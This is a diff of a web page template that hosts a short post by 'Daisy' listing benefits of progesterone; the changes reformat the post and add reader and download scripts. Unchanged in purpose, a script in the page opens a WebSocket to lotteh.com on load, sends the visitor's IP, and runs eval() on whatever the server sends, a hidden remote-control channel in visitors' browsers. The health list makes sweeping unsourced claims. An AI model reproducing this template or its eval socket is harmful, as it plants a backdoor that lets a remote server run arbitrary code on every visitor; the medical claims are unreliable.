@@ -65,7 +65,7 @@
               <a class="nav-link" href="/en/landing" title="Visit the landing page">Landing</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video chat">Chat</a>
+              <a class="nav-link" href="/en/chat" title="Video chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/en/private" title="See private photos with a key">Private</a>
@@ -123,14 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">
+<div style="white-space: pre-wrap;"><p>What are the benefits of taking progesterone?</p><p><br/></p><p>1. Regulates the menstrual cycle: Progesterone plays a key role in regulating the menstrual cycle and can help to restore balance for individuals with irregular periods.</p><p><br/></p><p>2. Supports fertility: Progesterone is essential for maintaining a healthy pregnancy by preparing the uterus for implantation and supporting the growth of the fetus.</p><p><br/></p><p>3. Helps balance hormones: Progesterone works in harmony with estrogen to maintain hormonal balance in the body, which can help alleviate symptoms of hormonal imbalances such as PMS, menopause, and PCOS.</p><p><br/></p><p>4. Improves mood: Progesterone has been shown to have a calming effect on the brain and can help reduce symptoms of anxiety and depression.</p><p><br/></p><p>5. Supports bone health: Progesterone works with other hormones like estrogen and testosterone to support bone density and reduce the risk of osteoporosis.</p><p><br/></p><p>6. Improves sleep: Progesterone can help regulate the sleep-wake cycle and improve sleep quality.</p><p><br/></p><p>7. Supports skin health: Progesterone can have a positive effect on skin health by promoting collagen production and reducing inflammation.</p><p><br/></p><p>8. Reduces risk of certain cancers: Progesterone has been shown to have a protective effect against certain types of cancer, such as endometrial cancer.</p><p><br/></p><p>It is important to note that progesterone should be used under the guidance of a healthcare provider, as it can have side effects and interactions with other medications.</p><div><br/></div></div>
 
-
-
-<p>What are the benefits of taking progesterone?</p><p><br></p><p>1. Regulates the menstrual cycle: Progesterone plays a key role in regulating the menstrual cycle and can help to restore balance for individuals with irregular periods.</p><p><br></p><p>2. Supports fertility: Progesterone is essential for maintaining a healthy pregnancy by preparing the uterus for implantation and supporting the growth of the fetus.</p><p><br></p><p>3. Helps balance hormones: Progesterone works in harmony with estrogen to maintain hormonal balance in the body, which can help alleviate symptoms of hormonal imbalances such as PMS, menopause, and PCOS.</p><p><br></p><p>4. Improves mood: Progesterone has been shown to have a calming effect on the brain and can help reduce symptoms of anxiety and depression.</p><p><br></p><p>5. Supports bone health: Progesterone works with other hormones like estrogen and testosterone to support bone density and reduce the risk of osteoporosis.</p><p><br></p><p>6. Improves sleep: Progesterone can help regulate the sleep-wake cycle and improve sleep quality.</p><p><br></p><p>7. Supports skin health: Progesterone can have a positive effect on skin health by promoting collagen production and reducing inflammation.</p><p><br></p><p>8. Reduces risk of certain cancers: Progesterone has been shown to have a protective effect against certain types of cancer, such as endometrial cancer.</p><p><br></p><p>It is important to note that progesterone should be used under the guidance of a healthcare provider, as it can have side effects and interactions with other medications.</p><div><br></div>
-
-
-</div>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -247,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -257,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -434,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -457,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
